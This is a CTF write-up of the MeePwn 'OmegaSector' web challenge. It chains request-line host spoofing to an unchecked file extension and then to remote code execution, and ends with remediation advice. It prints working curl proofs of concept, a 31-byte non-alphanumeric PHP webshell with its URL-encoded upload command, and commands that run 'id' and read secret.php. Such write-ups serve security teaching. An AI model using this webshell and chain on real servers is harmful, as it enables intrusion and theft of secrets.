# OmegaSector — Host Spoofing → Unrestricted File Write → Non-Alphanumeric RCE

**Class:** Trust-in-client host parsing (CWE-290 / CWE-20) chained with Unrestricted File Upload (CWE-434) → Remote Code Execution
**Stack:** PHP 5.6 / Apache (`php:5-apache`)
**Environment:** Local Docker lab — *OmegaSector*, a web challenge from the MeePwn CTF "My Awesome Web Challenge" set
**Impact:** A remote, initially-unauthorized visitor reaches a privileged area and then writes an executable `.php` file, yielding full RCE as `www-data`.

> Reproduced in a Docker lab I run locally. This is a public CTF challenge; the
> flag and secret salt are redacted. Techniques are shared for defensive learning.

---

## 1. Summary

The app decides *who you are* from the **host portion of your own request URI**:

```php
$whoareyou = parse_url($_SERVER['REQUEST_URI'], PHP_URL_HOST);
```

Normally a request URI carries no host, so this is empty and you are treated as a
stranger. But HTTP lets a client send an **absolute-form request target**
(`GET http://host/path HTTP/1.1`), which a proxy-style request produces. Do that and
`parse_url` happily returns *any host you like* — so you can declare yourself the
"human" or "alien" the app is gatekeeping for, and it sets a trusted session for you.

Behind that gate is a "leave a message" feature that calls `file_put_contents()` with
an **attacker-controlled file extension**. The message *content* is filtered, but the
*extension* is not — set it to `php` and you've written a script into the web root.
The content filter is defeated with a **sub-40-byte, fully non-alphanumeric PHP
webshell**, giving arbitrary command execution.

Two bugs, one chain: **auth bypass → RCE**.

---

## 2. Stage 1 — Host spoofing via `parse_url($_SERVER['REQUEST_URI'])`

### The vulnerable logic (`index.php`)

```php
$remote = $_SERVER['REQUEST_URI'];

if (strpos(urldecode($remote), '..')) { mapl_die(); }   // path-traversal guard

if (!parse_url($remote, PHP_URL_HOST)) {                // no host in the URI?
    $remote = 'http://' . $_SERVER['REMOTE_ADDR'] . $_SERVER['REQUEST_URI'];
}
$whoareyou = parse_url($remote, PHP_URL_HOST);          // ← identity decision

if ($whoareyou === "alien.somewhere.meepwn.team") {
    if ($_GET['alien'] === '@!#$@!@@') {
        $_SESSION['auth'] = hash('sha256', 'alien' . $salt);
        exit(header("Location: alien_sector.php"));
    }
} elseif ($whoareyou === "human.ludibrium.meepwn.team") {
    if ($_GET['human'] === 'Yes') {
        $_SESSION['auth'] = hash('sha256', 'human' . $salt);
        exit(header("Location: omega_sector.php"));
    }
}
```

### Why it is exploitable

`$_SERVER['REQUEST_URI']` is the **raw request target**, fully controlled by the
client. In the normal (origin-form) request `GET /index.php?... HTTP/1.1`, there is no
host, so `parse_url(..., PHP_URL_HOST)` is `NULL` → you're a stranger.

HTTP/1.1 also defines **absolute-form** request targets
(`GET http://human.ludibrium.meepwn.team/index.php?human=Yes HTTP/1.1`), normally used
when talking *to a proxy*. If we send that, `REQUEST_URI` now contains a host and
`parse_url` extracts exactly the value we chose. The `Host:` header is irrelevant —
the code reads the **request line**, not the header.

### PoC — become "human", then "alien"

`curl`'s proxy mode (`-x`) emits an absolute-form request target to the given server:

```bash
# HUMAN gate  → omega_sector.php
curl -s -i -x localhost:9003 \
  "http://human.ludibrium.meepwn.team/index.php?human=Yes"
# → HTTP/1.1 302 Found
# → Location: omega_sector.php     (+ Set-Cookie: PHPSESSID=...)

# ALIEN gate  → alien_sector.php   (note the '#' MUST be URL-encoded as %23,
#                                   or Apache answers 400 Bad Request)
curl -s -i -x localhost:9003 \
  "http://alien.somewhere.meepwn.team/index.php?alien=%40%21%23%24%40%21%40%40"
# → 302 → Location: alien_sector.php
```

In **Burp**: send any request to `127.0.0.1:9003` to Repeater, set the connection
target to `127.0.0.1:9003`, and edit the **first line** to absolute form:

```
GET http://alien.somewhere.meepwn.team/index.php?alien=%40%21%23%24%40%21%40%40 HTTP/1.1
Host: localhost:9003
```

> Pitfall observed live: putting the raw credential `@!#$@!@@` on the request line
> returns **400 Bad Request**, because a bare `#` is the URL fragment delimiter and
> Apache refuses it. URL-encode it (`#` → `%23`); PHP re-decodes `$_GET` so the
> `=== '@!#$@!@@'` check still passes.

The session cookie returned by the gate is scoped to the spoofed hostname, so carry
the `PHPSESSID` value explicitly into subsequent `localhost:9003` requests.

---

## 3. Stage 2 — Unrestricted file write → RCE

`omega_sector.php` (human) and `alien_sector.php` (alien) both require the session set
above, then expose a "save message" feature:

```php
// alien_sector.php (omega_sector.php is identical except the content regex)
$unique = md5(uniqid(rand(), true));
$type   = $_POST['type'];                              // ← file EXTENSION, unchecked
$check  = is_array($_POST['message'])
            ? implode('', $_POST['message'])
            : $_POST['message'];

if (!preg_match_all('/[a-z0-9]/is', $check)) {         // content filter (see below)
    if (strlen($check) > 40) { /* "only 40" */ }
    else {
        file_put_contents('alien_message/'.$unique.'.'.$_POST['type'], $check); // ← sink
        echo "Saved in alien_message/$unique.$type";   // ← tells you the path!
    }
}
```

### The three constraints (confirmed by probing, no source needed)

| Control | Observed behaviour |
|---------|--------------------|
| **`type` (extension)** | Not filtered, not length-limited. `type=php` → file saved as `…/<md5>.php`. |
| **`message` (content), human sector** | `preg_match_all('/\W/is', …)` → only `[A-Za-z0-9_]` allowed (no `<`, `?`, `$`). |
| **`message` (content), alien sector** | `preg_match_all('/[a-z0-9]/is', …)` → **no letters/digits** allowed (symbols & raw bytes OK). |
| **length** | `strlen($check) > 40` rejected. |

The two sectors have **complementary** filters. The human sector forbids the symbols
needed for PHP syntax (`<`, `?`, `$`) → useless for code. The **alien** sector forbids
letters and digits but *allows symbols and raw bytes ≥ 0x80* — exactly what
**non-alphanumeric PHP** needs.

### Black-box proof that the file executes

You do not need the source to know `.php` runs. The save response leaks the path, and
the hidden `<input name="type">` in the page HTML reveals you control the extension.
Then compare the same bytes under two extensions:

```bash
# upload identical content as .txt and as .php, then fetch both
GET /alien_message/<md5>.txt   → returns the RAW bytes  "<?=$_=${~"…"};…"   (not run)
GET /alien_message/<md5>.php   → executes                                   (code runs)
```

`.txt` echoes the source; `.php` consumes the `<?=` tag and runs → **unrestricted
upload → RCE** confirmed from the outside.

### The payload — a 31-byte non-alphanumeric webshell

Goal: build `$_GET` and call `$_GET['_']($_GET['__'])` without a single letter or
digit. The trick: the alien filter only blocks `[a-z0-9]`, so **raw bytes ≥ 0x80 pass**.
`~` (bitwise NOT) of a byte string flips each byte, so the complement of `"_GET"`
(`\xA0\xB8\xBA\xAB`, all ≥ 0x80) is a legal payload that evaluates back to `"_GET"`:

```php
<?=$_=${~"\xa0\xb8\xba\xab"};$_[_]($_[__]);
```

* `~"\xa0\xb8\xba\xab"` → `"_GET"`
* `$_ = ${"_GET"}`      → `$_` now aliases the `$_GET` superglobal
* `$_[_]($_[__])`       → `$_GET['_']($_GET['__'])` — a generic func+arg webshell
  (bare words `_` / `__` degrade to the strings `"_"` / `"__"` under PHP 5)

31 bytes — comfortably under the 40-byte cap, zero `[a-z0-9]`.

### PoC — upload and trigger

```bash
# 1) authenticate to the ALIEN gate, capture PHPSESSID (see Stage 1)
SID=...   # from the 302 response

# 2) URL-encode the raw payload bytes and POST them with type=php
#    message = <?=$_=${~"\xa0\xb8\xba\xab"};$_[_]($_[__]);
curl -s -b "PHPSESSID=$SID" \
  --data "type=php" \
  --data "message=%3C%3F%3D%24_%3D%24%7B~%22%A0%B8%BA%AB%22%7D%3B%24_%5B_%5D%28%24_%5B__%5D%29%3B" \
  "http://localhost:9003/alien_sector.php"
# → Saved in alien_message/<md5>.php

# 3) the file is now a generic webshell:  ?_=<function>&__=<argument>
curl -s "http://localhost:9003/alien_message/<md5>.php?_=system&__=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -s "http://localhost:9003/alien_message/<md5>.php?_=readfile&__=../secret.php"
# → dumps secret.php  →  $omega_sector_flag = "…redacted…";
```

Full command execution as `www-data`; the flag is read straight out of `secret.php`.

---

## 4. End-to-end chain

```
  Absolute-form request line
  GET http://alien.somewhere.meepwn.team/index.php?alien=%40%21%23%24%40%21%40%40
        │  parse_url(REQUEST_URI) === "alien.somewhere.meepwn.team"
        ▼
  $_SESSION['auth'] set  →  alien_sector.php unlocked
        │  POST type=php & message=<31-byte non-alnum PHP>
        ▼
  file_put_contents("alien_message/<md5>.php", payload)      (extension unchecked)
        │  GET alien_message/<md5>.php?_=system&__=id
        ▼
  Apache executes .php  →  RCE as www-data  →  read secret.php (flag)
```

---

## 5. Impact

Remote code execution as the web user from an **unauthenticated** starting point. An
attacker can read every file the app can (config, secrets, other tenants' data),
pivot into the container/host, and persist via the uploaded shell. Severity:
**Critical** — no prior credentials, fully reliable.

---

## 6. Remediation

Fix every link in the chain:

1. **Never derive identity from the request URI/Host.** Both are client-controlled.
   Authenticate with a real mechanism (credentials, signed tokens, mTLS). If you must
   read a hostname, use a server-fixed value (your own `ServerName`), never
   `parse_url($_SERVER['REQUEST_URI'])` or the `Host` header.
2. **Whitelist upload extensions** and store uploads **outside the web root** (or in a
   directory where execution is disabled: `php_admin_flag engine off`,
   `RemoveHandler`, no `.php` handler). Never build a filename from
   `'.' . $_POST['type']`.
3. **Don't rely on content regexes** to stop code upload — they are routinely bypassed
   (non-alphanumeric PHP, raw bytes, encodings). Treat *any* attacker-written file in
   a web-executable path as RCE.
4. **Generate server-side filenames** and set a benign, fixed extension; validate
   content by type, not by character class.

---

## 7. Takeaways

- **`$_SERVER['REQUEST_URI']` and `Host` are attacker input.** `parse_url` on them
  tells you what the client *claims*, not who they are. Absolute-form request targets
  turn "there's no host" into "any host I want".
- **The unchecked field is the one that gets you in.** Here the message body was
  carefully filtered while the *extension* was wide open — attackers attack the part
  nobody validated.
- **Character-class filters are not a sandbox.** Forbidding letters and digits still
  leaves a Turing-complete PHP via symbols + raw bytes; forbidding symbols still
  leaves data exfiltration paths. Allow-list behaviour, don't deny-list characters.
- **Black-box is enough to *find* it.** The response leaked the saved path, the HTML
  leaked the `type` field, and a `.txt`-vs-`.php` diff proved execution. Source only
  sped up crafting the payload to fit the filters.
- **`id` is only a proof.** It demonstrates execution; the real impact is reading
  secrets and owning the host.

---

*Public CTF challenge (MeePwn — "My Awesome Web Challenge" / OmegaSector), solved in a
local Docker lab. Flag and salt redacted; commands reproduced from the live solve.*
